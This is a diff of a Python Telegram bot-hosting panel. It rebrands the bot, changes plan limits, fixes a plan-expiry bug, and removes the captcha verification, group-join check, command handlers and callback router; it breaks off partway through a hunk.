@@ -564,7 +564,7 @@ try:
 except (TypeError, ValueError):
     KEEPALIVE_PORT = 10000
 
-BRAND       = "ѕιмяαη нoѕтιηg ＲΒOT"
+BRAND       = "DK Hosting RBOT"
 BRAND_VER   = "v2.1"
 BRAND_TAG   = f"{BRAND} {BRAND_VER}"
 SUPPORT_USR = "@nur7871"
@@ -671,8 +671,8 @@ PLAN_LIMITS: Dict[str, Dict[str, Any]] = {
     "starter":    {"name": "Starter",    "max_bots": 4,   "ram": 256,  "auto_restart": True,  "price": 99,   "days": 30},
     "basic":      {"name": "Basic",      "max_bots": 6,  "ram": 512,  "auto_restart": True,  "price": 199,  "days": 30},
     "pro":        {"name": "Pro",        "max_bots": 8,  "ram": 2048, "auto_restart": True,  "price": 499,  "days": 30},
-    "enterprise": {"name": "Enterprise", "max_bots": 10,  "ram": 4096, "auto_restart": True,  "price": 999,  "days": 30},
-    "lifetime":   {"name": "Lifetime",   "max_bots": 15, "ram": 8192, "auto_restart": True,  "price": 1999, "days": 36500},
+    "enterprise": {"name": "Enterprise", "max_bots": 50,  "ram": 4096, "auto_restart": True,  "price": 999,  "days": 30},
+    "lifetime":   {"name": "Lifetime",   "max_bots": 100, "ram": 8192, "auto_restart": True,  "price": 1999, "days": 36500},
 }
 
 PAYMENT_METHODS: Dict[str, Dict[str, Any]] = {
@@ -1262,7 +1262,7 @@ class KeyRing:
         h = kw.pop("headers", {}) or {}
         h.setdefault("Authorization", f"token {self._gh_token()}")
         h.setdefault("Accept", "application/vnd.github+json")
-        h.setdefault("User-Agent", "simran-hosting-rbot/2.1")
+        h.setdefault("User-Agent", "dk-hosting-rbot/2.1")
         try:
             return requests.request(method, url, headers=h, timeout=30, **kw)
         except Exception:
@@ -3058,7 +3058,7 @@ def _gh(method: str, url: str, **kw) -> requests.Response:
     h = kw.pop("headers", {}) or {}
     h.setdefault("Authorization", f"token {GH['token']}")
     h.setdefault("Accept", "application/vnd.github+json")
-    h.setdefault("User-Agent", "simran-hosting-rbot/2.1")
+    h.setdefault("User-Agent", "dk-hosting-rbot/2.1")
     return requests.request(method, url, headers=h, timeout=60, **kw)
 
 
@@ -3728,13 +3728,14 @@ def grant_plan(uid: int, plan: str, days: Optional[int] = None) -> bool:
         u["plan"] = "free"
         u["plan_expires"] = None
     else:
+        _old_plan = u.get("plan")
         u["plan"] = plan
         # extend if same plan; else set fresh
         try:
             cur_exp = datetime.fromisoformat(str(u.get("plan_expires") or "").replace("Z", "+00:00"))
         except Exception:
             cur_exp = now_utc()
-        if cur_exp < now_utc() or u.get("plan") != plan:
+        if cur_exp < now_utc() or _old_plan != plan:
             cur_exp = now_utc()
         u["plan_expires"] = (cur_exp + timedelta(days=days)).isoformat()
         u["last_expiry_warn"] = -1
@@ -3772,19 +3773,20 @@ _LOADING_STOPS: Dict[Tuple[int, int], "threading.Event"] = {}
 _LOADING_LOCK = threading.Lock()
 
 
-def _progress_bar(pct: int, width: int = 20) -> str:
-    """`▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░ 70%` style bar."""
-    pct = max(0, min(100, int(pct)))
-    filled = int(round(width * pct / 100))
-    return "▓" * filled + "░" * (width - filled) + f" {pct:>3}%"
-
-
 def _cancel_loading(chat_id: int, message_id: int) -> None:
     """Stop any animation thread attached to this message."""
     with _LOADING_LOCK:
         evt = _LOADING_STOPS.pop((chat_id, message_id), None)
     if evt:
         evt.set()
+
+
+def _pct_bar(pct: int, width: int = 20) -> str:
+    """Render a simple ▓░ bar from a 0-100 percentage (used by loading()).
+    Distinct from _progress_bar(current, total) which is used for broadcast stats."""
+    pct = max(0, min(100, int(pct)))
+    filled = int(pct / 100 * width)
+    return "▓" * filled + "░" * (width - filled) + f" {pct}%"
 
 
 def loading(call: types.CallbackQuery, label: str = "Loading") -> None:
@@ -3827,7 +3829,7 @@ def loading(call: types.CallbackQuery, label: str = "Loading") -> None:
         body = (
             f"<b>↻ {label_safe}…</b>\n"
             f"{G['div']}\n"
-            f"<code>{_progress_bar(pct)}</code>\n"
+            f"<code>{_pct_bar(pct)}</code>\n"
             f"<i>{sc('Please wait')}</i>{FOOTER}"
         )
         try:
@@ -3948,591 +3950,16 @@ _CAPTCHA_FONT_PATHS = (
 )
 
 
-def _captcha_font(size: int):
-    if not _PIL_OK:
-        return None
-    for fp in _CAPTCHA_FONT_PATHS:
-        try:
-            if os.path.exists(fp):
-                return ImageFont.truetype(fp, size)
-        except Exception:
-            continue
-    try:
-        return ImageFont.load_default()
-    except Exception:
-        return None
-
-
-def _gen_captcha_image() -> Tuple[Optional[bytes], str, List[str]]:
-    """Generate captcha PNG bytes + the correct (circled) character +
-    the 6 button options (shuffled, includes correct + 3 captcha chars
-    + 2 distractors)."""
-    text = "".join(random.choice(_CAPTCHA_POOL) for _ in range(4))
-    correct_idx = random.randrange(4)
-    correct_ch = text[correct_idx]
-
-    options = list(set(text))
-    while len(options) < 6:
-        c = random.choice(_CAPTCHA_POOL)
-        if c not in options:
-            options.append(c)
-    random.shuffle(options)
-
-    if not _PIL_OK:
-        return None, correct_ch, options
-
-    W, H = 720, 320
-    bg = (15, 23, 42)  # slate-900
-    img = Image.new("RGB", (W, H), bg)
-    draw = ImageDraw.Draw(img)
-
-    # background noise — diagonal bands
-    for _ in range(10):
-        x1, y1 = random.randint(-50, W), random.randint(-50, H)
-        x2, y2 = x1 + random.randint(150, 400), y1 + random.randint(-80, 80)
-        draw.line([(x1, y1), (x2, y2)],
-                  fill=(40, 50, 70), width=random.randint(2, 4))
-    # speckle noise
-    for _ in range(450):
-        x, y = random.randint(0, W - 1), random.randint(0, H - 1)
-        v = random.randint(80, 200)
-        draw.point((x, y), fill=(v, v, v))
-
-    font = _captcha_font(140)
-
-    # draw each char on its own RGBA tile, rotate, paste
-    char_centers: List[Tuple[int, int]] = []
-    slot_w = W // 4
-    palette = [
-        (250, 204, 21),   # amber
-        (96, 165, 250),   # blue
-        (236, 72, 153),   # pink
-        (52, 211, 153),   # green
-        (244, 114, 182),  # rose
-        (251, 146, 60),   # orange
-    ]
-    for i, ch in enumerate(text):
-        tile = Image.new("RGBA", (200, 240), (0, 0, 0, 0))
-        td = ImageDraw.Draw(tile)
-        col = random.choice(palette)
-        try:
-            td.text((30, 30), ch, font=font, fill=col + (255,))
-        except Exception:
-            td.text((30, 30), ch, fill=col + (255,))
-        tile = tile.rotate(random.randint(-22, 22),
-                           resample=Image.BILINEAR)
-        cx = slot_w * i + slot_w // 2 - 100 + random.randint(-10, 10)
-        cy = (H - 240) // 2 + random.randint(-15, 15)
-        img.paste(tile, (cx, cy), tile)
-        char_centers.append((cx + 100, cy + 120))
-
-    # red circle on the chosen char
-    cx, cy = char_centers[correct_idx]
-    r = 90
-    for dr in range(0, 5):
-        draw.ellipse(
-            [cx - r - dr, cy - r - dr, cx + r + dr, cy + r + dr],
-            outline=(239, 68, 68),
-        )
-
-    # bottom hint strip
-    hint_font = _captcha_font(28)
-    hint = "tap the circled character"
-    try:
-        bbox = draw.textbbox((0, 0), hint, font=hint_font)
-        tw = bbox[2] - bbox[0]
-    except Exception:
-        tw = len(hint) * 10
-    draw.rectangle([0, H - 44, W, H], fill=(30, 41, 59))
-    try:
-        draw.text(((W - tw) // 2, H - 38), hint,
-                  font=hint_font, fill=(226, 232, 240))
-    except Exception:
-        pass
-
-    buf = io.BytesIO()
-    img.save(buf, format="PNG", optimize=True)
-    return buf.getvalue(), correct_ch, options
-
-
-def _progress_bar_text(pct: int) -> str:
-    pct = max(0, min(100, pct))
-    filled = pct // 10
-    bar = "▰" * filled + "▱" * (10 - filled)
-    return (
-        f"<b>{G['shield']} {sc('Verifying you')}…</b>\n"
-        f"{G['div']}\n"
-        f"<b><code>[{bar}] {pct:3d}%</code></b>"
-    )
-
-
-def _send_progress_then_captcha(chat_id: int, uid: int) -> None:
-    """Phase 1: animated progress bar (one message, edited).
-       Phase 2: same message edited to 'solve captcha' — no delete."""
-    msg_id: Optional[int] = None
-    try:
-        m = bot.send_message(chat_id, _progress_bar_text(10),
-                             parse_mode="HTML")
-        msg_id = m.message_id
-    except Exception:
-        pass
-
-    for pct in (25, 45, 65, 85, 100):
-        time.sleep(0.45)
-        if msg_id is None:
-            break
-        try:
-            bot.edit_message_text(
-                _progress_bar_text(pct), chat_id, msg_id,
-                parse_mode="HTML",
-            )
-        except Exception:
-            pass
-
-    # Delete NAHI — edit karo
-    if msg_id is not None:
-        try:
-            bot.edit_message_text(
-                f"<b>{G['shield']} {sc('Verification loading')}… {sc('solve captcha below')} ↓</b>",
-                chat_id, msg_id,
-                parse_mode="HTML",
-            )
-        except Exception:
-            pass
-
-    _send_captcha(chat_id, uid)
-
-
-def _send_captcha(chat_id: int, uid: int) -> None:
-    png, correct, opts = _gen_captcha_image()
-    kb = types.InlineKeyboardMarkup()
-    btns = [Btn(c, callback_data=f"verify_{c}")
-            for c in opts]
-    for i in range(0, len(btns), 3):
-        kb.row(*btns[i:i + 3])
-    kb.row(
-        Btn(
-            f"{G.get('refresh', '↻')} {sc('New captcha')}",
-            callback_data="verify_new",
-        )
-    )
-
-    cap = (
-        f"<b>{G['shield']} {sc('Human verification')}</b>\n"
-        f"{G['div']}\n"
-        f"{sc('Look at the image above')}.\n"
-        f"{sc('One character has a red circle around it')}.\n"
-        f"<b>{sc('Tap that exact character below')}.</b>\n"
-        f"{G['div']}\n"
-        f"{bullet('Tries', '3')}\n"
-        f"{bullet('Tip', sc('use New captcha if unreadable'))}"
-        f"{FOOTER}"
-    )
-
-    sent_id: Optional[int] = None
-    try:
-        if png is not None:
-            m = bot.send_photo(
-                chat_id, png, caption=cap,
-                parse_mode="HTML", reply_markup=kb,
-            )
-            sent_id = m.message_id
-        else:
-            # PIL unavailable — text-only fallback
-            text_cap = (
-                f"<b>{G['shield']} {sc('Human verification')}</b>\n"
-                f"{G['div']}\n"
-                f"{sc('Tap this exact character')}: <b><code>{esc(correct)}</code></b>"
-                f"{FOOTER}"
-            )
-            m = bot.send_message(
-                chat_id, text_cap, parse_mode="HTML", reply_markup=kb,
-            )
-            sent_id = m.message_id
-    except Exception as e:
-        print(f"[verify] send failed: {e}", flush=True)
-        return
-
-    with _verify_lock:
-        prev = VERIFY_STATES.get(uid) or {}
-        VERIFY_STATES[uid] = {
-            "answer": correct,
-            "options": opts,
-            "msg_id": sent_id,
-            "chat_id": chat_id,
-            "tries": 0,
-            # carry regens forward so the regen rate-limit isn't reset
-            "regens": int(prev.get("regens", 0)),
-            "ts": time.time(),
-        }
-
-
-def _verify_state_janitor() -> None:
-    """Drop captcha sessions older than 10 minutes — prevents
-    VERIFY_STATES from growing unbounded if users abandon."""
-    while True:
-        try:
-            time.sleep(120)
-            cutoff = time.time() - 600
-            with _verify_lock:
-                stale = [u for u, s in VERIFY_STATES.items()
-                         if s.get("ts", 0) < cutoff]
-                for u in stale:
-                    VERIFY_STATES.pop(u, None)
-            if stale:
-                print(f"[verify] cleaned {len(stale)} stale captcha state(s)",
-                      flush=True)
-        except Exception as e:
-            print(f"[verify] janitor error: {e}", flush=True)
-
-
 # ─── Group Join Verification ─────────────────────────────────────
 REQUIRED_GROUPS = [
     {"id": -1003715566556, "link": "https://t.me/+OClpzDTPSGxkZWU1", "name": "Group 1"},
     {"id": -1003776599179, "link": "https://t.me/autolikegcrbot",     "name": "Group 2"},
 ]
 
-def _check_group_membership(uid: int) -> List[Dict]:
-    """Returns list of groups the user has NOT joined yet."""
-    not_joined = []
-    for grp in REQUIRED_GROUPS:
-        try:
-            member = bot.get_chat_member(grp["id"], uid)
-            if member.status in ("left", "kicked", "banned"):
-                not_joined.append(grp)
-        except Exception:
-            not_joined.append(grp)
-    return not_joined
-
-def _send_join_verification(chat_id: int, uid: int, not_joined: List[Dict]) -> None:
-    """Send group join buttons to user."""
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    for grp in not_joined:
-        kb.add(Btn(
-            f"{G['fwd']}  Jᴏɪɴ {grp['name']}", url=grp["link"]))
-    kb.add(Btn(
-        f"{G['ok']}  Vᴇʀɪꜰɪᴄᴀᴛɪᴏɴ", callback_data="group_verify_check"))
-    cap = (
-        f"<b>{G['shield']} {sc('Group Join Required')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('You must join the following groups to use this bot')}:\n"
-        f"{G['div']}\n"
-        + "\n".join(f"{G['bullet']} <a href='{g['link']}'>{esc(g['name'])}</a>" for g in not_joined)
-        + f"\n{G['div']}\n"
-        f"{sc('After joining, tap')} <b>{sc('Verification')}</b> {sc('below')}."
-        f"{FOOTER}"
-    )
-    try:
-        bot.send_message(chat_id, cap, parse_mode="HTML", reply_markup=kb,
-                         disable_web_page_preview=True)
-    except Exception as e:
-        print(f"[group_verify] send failed: {e}", flush=True)
-
-def require_group_membership(chat_id: int, uid: int) -> bool:
-    """Returns True if user has joined all required groups.
-    Otherwise sends join prompt and returns False."""
-    if uid == OWNER_ID and OWNER_ID > 0:
-        return True
-    if is_admin(uid):
-        return True
-    not_joined = _check_group_membership(uid)
-    if not not_joined:
-        return True
-    _send_join_verification(chat_id, uid, not_joined)
-    return False
 # ─────────────────────────────────────────────────────────────────
 
-def _is_verified(uid: int) -> bool:
-    if uid == OWNER_ID and OWNER_ID > 0:
-        return True
-    u = db_load_ro()["users"].get(str(uid)) or {}
-    return bool(u.get("verified"))
-
-
-def _mark_verified(uid: int) -> None:
-    db = db_load()
-    if str(uid) in db["users"]:
-        db["users"][str(uid)]["verified"] = True
-        db["users"][str(uid)]["verified_at"] = ts_iso()
-        db_save(db)
-
-
-def require_verified(chat_id: int, uid: int) -> bool:
-    """Returns True if the user is already verified.
-    Otherwise launches the progress-bar + captcha flow and returns False.
-    Callers should `return` immediately on False.
-
-    Anti-spam: if a captcha session is already pending for this user
-    (progress bar still animating or buttons still on screen) we silently
-    drop the duplicate /start instead of stacking another progress bar."""
-    if _is_verified(uid):
-        return True
-    with _verify_lock:
-        st = VERIFY_STATES.get(uid)
-        now = time.time()
-        # Active session = either started in last 6s (progress bar phase)
-        # or has a captcha message id (buttons still up).
-        if st and (st.get("msg_id") or now - st.get("ts", 0) < 6):
-            return False
-        # Reserve the slot so the second /start lands in the branch above.
-        VERIFY_STATES[uid] = {
-            "answer": "", "options": [], "msg_id": None,
-            "chat_id": chat_id, "tries": 0, "regens": 0,
-            "ts": now, "starting": True,
-        }
-    threading.Thread(
-        target=_send_progress_then_captcha,
-        args=(chat_id, uid),
-        daemon=True,
-    ).start()
-    return False
-
-
-@bot.callback_query_handler(func=lambda c: c.data == "group_verify_check")
-def cb_group_verify(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    chat_id = call.message.chat.id
-    not_joined = _check_group_membership(uid)
-    if not_joined:
-        ack(call, "You have not joined all groups yet!")
-        try:
-            bot.delete_message(chat_id, call.message.message_id)
-        except Exception:
-            pass
-        _send_join_verification(chat_id, uid, not_joined)
-    else:
-        ack(call, "✓ Verified! Welcome.")
-        try:
-            bot.delete_message(chat_id, call.message.message_id)
-        except Exception:
-            pass
-        render_main_menu(chat_id, uid)
-
-
-@bot.callback_query_handler(func=lambda c: bool(c.data) and c.data.startswith("verify_"))
-def cb_verify(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    chat_id = call.message.chat.id
-    data = call.data[len("verify_"):]
-
-    # NEW captcha (regen)
-    if data == "new":
-        with _verify_lock:
-            st = VERIFY_STATES.get(uid)
-            if st and st.get("regens", 0) >= 5:
-                ack(call, "Too many regenerations.")
-                return
-        try:
-            bot.delete_message(chat_id, call.message.message_id)
-        except Exception:
-            pass
-        ack(call, "New captcha…")
-        _send_captcha(chat_id, uid)
-        with _verify_lock:
-            if uid in VERIFY_STATES:
-                VERIFY_STATES[uid]["regens"] = (
-                    VERIFY_STATES[uid].get("regens", 0) + 1
-                )
-        return
-
-    with _verify_lock:
-        state = VERIFY_STATES.get(uid)
-
-    if not state:
-        ack(call, "Session expired — send /start again.")
-        return
-
-    if data == state["answer"]:
-        with _verify_lock:
-            VERIFY_STATES.pop(uid, None)
-        _mark_verified(uid)
-        ack(call, "✓ Verified")
-        try:
-            bot.delete_message(chat_id, state["msg_id"])
-        except Exception:
-            pass
-        intro = (
-            f"<b>{G['ok']} {sc('Verification complete')}</b> — "
-            f"{sc('welcome')}, <b>{esc(call.from_user.first_name or 'friend')}</b>!"
-        )
-        try:
-            audit(uid, "captcha_pass",
-                  f"verified after {state.get('tries', 0)} try(s)")
-        except Exception:
-            pass
-        render_main_menu(chat_id, uid, intro=intro)
-        return
-
-    # wrong answer
-    state["tries"] = state.get("tries", 0) + 1
-    left = max(0, 3 - state["tries"])
-    if state["tries"] >= 3:
-        with _verify_lock:
-            VERIFY_STATES.pop(uid, None)
-        try:
-            bot.delete_message(chat_id, state["msg_id"])
-        except Exception:
-            pass
-        ack(call, "Wrong 3 times — new captcha.")
-        _send_captcha(chat_id, uid)
-    else:
-        ack(call, f"Wrong character. {left} try(s) left.")
-
-
-# ═════════════════════════════════════════════════════════════════
-# 16. /start  AND  MAIN MENU
-# ═════════════════════════════════════════════════════════════════
-
-def render_main_menu(chat_id: int, uid: int,
-                     call: Optional[types.CallbackQuery] = None,
-                     intro: Optional[str] = None) -> None:
-    u = db_load()["users"].get(str(uid)) or {}
-    plan = PLAN_LIMITS.get(u.get("plan", "free"), PLAN_LIMITS["free"])
-    bots = list_user_bots(uid)
-    running = sum(1 for b in bots if b["_id"] in RUNNING and RUNNING[b["_id"]]["proc"].poll() is None)
-    intro_block = f"{intro}\n{G['div']}\n" if intro else ""
-    cap = (
-        f"<b>{esc(BRAND)} {esc(BRAND_VER)}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{intro_block}"
-        f"<b>{sc('Welcome')}</b>, {esc(u.get('name') or 'friend')}\n"
-        f"{bullet('Plan',  plan['name'])}\n"
-        f"{bullet('Until', fmt_ts(u.get('plan_expires')) if u.get('plan_expires') else 'Forever' if plan['price'] == 0 else '—')}\n"
-        f"{bullet('Bots',  f'{len(bots)} / {user_max_bots(u)}  (running {running})')}\n"
-        f"{bullet('Wallet', '{}$'.format(u.get('wallet', 0)))}\n"
-        f"{G['div']}\n"
-        f"Choose an option below.{FOOTER}"
-    )
-    show_menu(chat_id, PHOTOS["main"], cap, main_menu_kb(is_admin(uid)), call=call)
-
-
 # ─── Silent mode in groups — bot will not respond in any group/channel ───────
-def _is_private(m) -> bool:
-    """Returns True only for private chats."""
-    try:
-        return m.chat.type == "private"
-    except Exception:
-        return True
 # ─────────────────────────────────────────────────────────────────────────────
-
-@bot.message_handler(commands=["start"])
-def cmd_start(m: types.Message) -> None:
-    if not _is_private(m):
-        return  # silent in groups
-    uid = m.from_user.id
-    if not RATE.allow(uid):
-        maybe_auto_ban(uid, "rate")
-        return
-    if banned_block(m):
-        return
-    # ── auto-claim ownership: first /start with no OWNER_ID env wins ──
-    global OWNER_ID
-    if OWNER_ID <= 0:
-        stored = int(get_setting("owner_id", 0) or 0)
-        if stored > 0:
-            OWNER_ID = stored
-        else:
-            OWNER_ID = uid
-            set_setting("owner_id", uid)
-            audit(uid, "owner_claim", f"first /start, uid={uid}")
-            try:
-                bot.send_message(
-                    m.chat.id,
-                    f"<b>{G['crown']} {sc('You are now the panel owner')}</b>\n"
-                    f"{G['div']}\n"
-                    f"{bullet('Owner ID', uid)}\n"
-                    f"{sc('Set OWNER_ID env var to lock ownership permanently')}.",
-                    parse_mode="HTML",
-                )
-            except Exception:
-                pass
-    ref: Optional[int] = None
-    parts = (m.text or "").split(maxsplit=1)
-    if len(parts) == 2 and parts[1].isdigit():
-        ref = int(parts[1])
-    u, is_new = get_or_create_user(m.from_user, ref=ref)
-    if maintenance_block(uid):
-        bot.send_message(
-            m.chat.id,
-            f"<b>{G['warn']} {sc('Panel under maintenance')}</b>\n\n"
-            f"We will be back shortly. {SUPPORT_USR} for urgent issues.",
-        )
-        return
-    # Human verification — first /start ever for this user shows a
-    # progress bar (10% → 100%) followed by a captcha photo. Once the
-    # captcha is solved, render_main_menu is called from cb_verify.
-    if not require_verified(m.chat.id, uid):
-        return
-
-    # Group join verification — user must join required groups
-    if not require_group_membership(m.chat.id, uid):
-        return
-
-    # Single message: welcome line is folded into the main-menu caption,
-    # so /start always sends exactly ONE photo + menu.
-    intro = (
-        f"{sc('You are now registered')}. "
-        f"Tap <b>{sc('Plans')}</b> or <b>{sc('Upload Bot')}</b> to begin."
-        if is_new else
-        f"{sc('Welcome back')}, <b>{esc(m.from_user.first_name or 'friend')}</b>!"
-    )
-    render_main_menu(m.chat.id, uid, intro=intro)
-
-
-@bot.message_handler(commands=["help"])
-def cmd_help(m: types.Message) -> None:
-    if not _is_private(m):
-        return
-    if banned_block(m):
-        return
-    if not require_verified(m.chat.id, m.from_user.id):
-        return
-    txt = (
-        f"<b>{esc(BRAND_TAG)} — {sc('Quick Help')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Upload',  'Send a .py / .js / .zip file or use Upload Bot menu.')}\n"
-        f"{bullet('Manage',  'My Bots → pick a bot → Start / Stop / Logs.')}\n"
-        f"{bullet('Plans',   'Plans → Buy Plan → choose method → send proof.')}\n"
-        f"{bullet('Wallet',  'Top-up via admin, then spend on plans.')}\n"
-        f"{bullet('Refer',   'Invite friends with your /start link to earn slots.')}\n"
-        f"{bullet('Trial',   'One-time 48-hour Pro trial in the Trial menu.')}\n"
-        f"{bullet('Support', f'Open a ticket from the Tickets menu, or DM {SUPPORT_USR}.')}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    bot.send_message(m.chat.id, txt, parse_mode="HTML",
-                     reply_markup=back_main_kb(), disable_web_page_preview=True)
-
-
-@bot.message_handler(commands=["menu"])
-def cmd_menu(m: types.Message) -> None:
-    if not _is_private(m):
-        return
-    if banned_block(m):
-        return
-    get_or_create_user(m.from_user)
-    if not require_verified(m.chat.id, m.from_user.id):
-        return
-    render_main_menu(m.chat.id, m.from_user.id)
-
-
-@bot.message_handler(commands=["id"])
-def cmd_id(m: types.Message) -> None:
-    if not _is_private(m):
-        return
-    bot.reply_to(m, f"<code>{m.from_user.id}</code>")
-
-
-@bot.message_handler(commands=["cancel"])
-def cmd_cancel(m: types.Message) -> None:
-    if not _is_private(m):
-        return
-    USER_STATES.pop(m.from_user.id, None)
-    bot.reply_to(m, f"{G['ok']} {sc('Cancelled')}")
-
-
-# ═════════════════════════════════════════════════════════════════
-# 17. CALLBACK ROUTER  (top level)
-# ═════════════════════════════════════════════════════════════════
 
 # ─── callback de-duplication ─────────────────────────────────────
 # Telegram occasionally re-delivers the same callback (rapid double-clicks,
@@ -4543,2200 +3970,6 @@ def cmd_cancel(m: types.Message) -> None:
 _CB_SEEN: "deque[Tuple[str, float]]" = deque(maxlen=512)
 _CB_SEEN_LOCK = threading.Lock()
 _CB_DEDUP_WINDOW = 12.0  # seconds
-
-
-def _is_duplicate_callback(call_id: str) -> bool:
-    if not call_id:
-        return False
-    now = time.time()
-    with _CB_SEEN_LOCK:
-        # purge expired entries
-        while _CB_SEEN and now - _CB_SEEN[0][1] > _CB_DEDUP_WINDOW:
-            _CB_SEEN.popleft()
-        for cid, _ in _CB_SEEN:
-            if cid == call_id:
-                return True
-        _CB_SEEN.append((call_id, now))
-    return False
-
-
-@bot.callback_query_handler(func=lambda c: True)
-def cb_root(call: types.CallbackQuery) -> None:
-    # silently drop duplicate deliveries of the same callback
-    if _is_duplicate_callback(getattr(call, "id", "")):
-        try:
-            bot.answer_callback_query(call.id)
-        except Exception:
-            pass
-        return
-
-    uid = call.from_user.id
-    if not RATE.allow(uid):
-        ack(call, "Slow down.")
-        maybe_auto_ban(uid, "callback rate")
-        return
-    if banned_block(call):
-        ack(call)
-        return
-    get_or_create_user(call.from_user)
-    if maintenance_block(uid):
-        ack(call, "Maintenance mode")
-        return
-    # Block menu navigation for unverified users — they must solve the
-    # captcha first. The verify_* callbacks are handled by an earlier
-    # registered handler so they bypass this gate.
-    if not _is_verified(uid):
-        ack(call, "Please solve the captcha first — send /start.")
-        return
-    data = call.data or ""
-    try:
-        _route_callback(call, data)
-    except Exception as e:
-        traceback.print_exc()
-        try:
-            bot.send_message(call.message.chat.id, f"<b>{G['no']}</b> Eʀʀᴏʀ: <code>{esc(e)}</code>")
-        except Exception:
-            pass
-
-
-def _route_callback(call: types.CallbackQuery, data: str) -> None:
-    # ─── core menu navigation ──────────────────────────────────
-    if data == "menu_main":
-        ack(call); render_main_menu(call.message.chat.id, call.from_user.id, call); return
-    if data == "menu_bots":
-        ack(call); render_bots_menu(call); return
-    if data == "menu_upload":
-        ack(call); render_upload_menu(call); return
-    if data == "menu_plans":
-        ack(call); render_plans_menu(call); return
-    if data == "menu_buy":
-        ack(call); render_buy_menu(call); return
-    if data == "menu_profile":
-        ack(call); render_profile(call); return
-    if data == "menu_referral":
-        ack(call); render_referral(call); return
-    if data == "menu_wallet":
-        ack(call); render_wallet(call); return
-    if data == "menu_help":
-        ack(call); render_help(call); return
-    if data == "menu_support":
-        ack(call); render_support(call); return
-    if data == "menu_tickets":
-        ack(call); render_user_tickets(call); return
-    if data == "menu_trial":
-        ack(call); render_trial(call); return
-    if data == "menu_coupon":
-        ack(call); render_coupon(call); return
-    if data == "menu_stats":
-        ack(call); render_user_stats(call); return
-    if data == "menu_admin":
-        ack(call); render_admin(call); return
-
-    # ─── plan view + buy ───────────────────────────────────────
-    if data.startswith("plan_view_"):
-        ack(call); render_plan_detail(call, data.split("_", 2)[2]); return
-    if data.startswith("plan_buy_"):
-        ack(call); render_payment_methods_for(call, data.split("_", 2)[2]); return
-
-    # ─── pay methods ───────────────────────────────────────────
-    if data.startswith("pay_"):
-        ack(call); render_payment_screen(call, data); return
-    if data == "pay_proof":
-        ack(call); start_proof_flow(call); return
-
-    # ─── bot actions ───────────────────────────────────────────
-    if data.startswith("bot_view_"):
-        ack(call); render_bot_view(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_start_"):
-        ack(call); action_bot_start(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_stop_"):
-        ack(call); action_bot_stop(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_restart_"):
-        ack(call); action_bot_restart(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_logs_"):
-        ack(call); action_bot_logs(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_info_"):
-        ack(call); action_bot_info(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_env_"):
-        ack(call); render_env_menu(call, data.split("_", 2)[2]); return
-    if data.startswith("env_add_"):
-        ack(call); start_env_add(call, data.split("_", 2)[2]); return
-    if data.startswith("env_del_"):
-        parts = data.split("_", 3)
-        if len(parts) >= 4:
-            ack(call); action_env_delete(call, parts[2], parts[3]); return
-    if data.startswith("bot_cron_"):
-        ack(call); render_cron(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_clone_"):
-        ack(call); action_bot_clone(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_dl_"):
-        ack(call); action_bot_download(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_pip_"):
-        ack(call); start_pip_install_flow(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_tunnel_"):
-        ack(call); start_tunnel_flow(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_delete_"):
-        ack(call); render_bot_delete_confirm(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_delyes_"):
-        ack(call); action_bot_delete(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_delfiles_"):
-        ack(call); render_bot_delfiles_confirm(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_delall_"):
-        ack(call); render_bot_delall_confirm(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_delfilesyes_"):
-        ack(call); action_bot_delfiles(call, data.split("_", 2)[2]); return
-    if data.startswith("bot_delalyes_"):
-        ack(call); action_bot_delall(call, data.split("_", 2)[2]); return
-
-    # ─── approval system (admin only) ──────────────────────────
-    if data.startswith("appr_ok_"):
-        if not admin_only_call(call, "approve_payment"):
-            return
-        bid = data[len("appr_ok_"):]
-        res = approve_bot(bid, call.from_user.id)
-        ack(call, "Approved" if res.get("ok") else f"Err: {res.get('error')}")
-        try:
-            bot.edit_message_reply_markup(call.message.chat.id,
-                                          call.message.message_id, reply_markup=None)
-        except Exception:
-            pass
-        try:
-            bot.send_message(
-                call.message.chat.id,
-                f"<b>{G['ok']} {sc('Bot approved')}</b>\n"
-                f"{bullet('Bot ID', bid)}",
-                parse_mode="HTML",
-            )
-        except Exception:
-            pass
-        return
-    if data.startswith("appr_no_"):
-        if not admin_only_call(call, "approve_payment"):
-            return
-        bid = data[len("appr_no_"):]
-        res = reject_bot(bid, call.from_user.id, reason="rejected by admin")
-        ack(call, "Rejected" if res.get("ok") else f"Err: {res.get('error')}")
-        try:
-            bot.edit_message_reply_markup(call.message.chat.id,
-                                          call.message.message_id, reply_markup=None)
-        except Exception:
-            pass
-        try:
-            bot.send_message(
-                call.message.chat.id,
-                f"<b>{G['no']} {sc('Bot rejected')}</b>\n"
-                f"{bullet('Bot ID', bid)}",
-                parse_mode="HTML",
-            )
-        except Exception:
-            pass
-        return
-
-    # ─── admin sub-actions ─────────────────────────────────────
-    if data.startswith("adm_"):
-        if not admin_only_call(call, "view_stats"):
-            return
-        ack(call); render_admin_subroute(call, data); return
-    if data.startswith("gh_"):
-        if not admin_only_call(call, "view_stats"):
-            return
-        ack(call); render_github_subroute(call, data); return
-
-    # ─── trial ────────────────────────────────────────────────
-    if data == "trial_claim":
-        ack(call); action_trial_claim(call); return
-
-    # ─── coupon redeem ─────────────────────────────────────────
-    if data == "coupon_redeem":
-        ack(call); start_coupon_flow(call); return
-
-    # ─── tickets ──────────────────────────────────────────────
-    if data == "ticket_open":
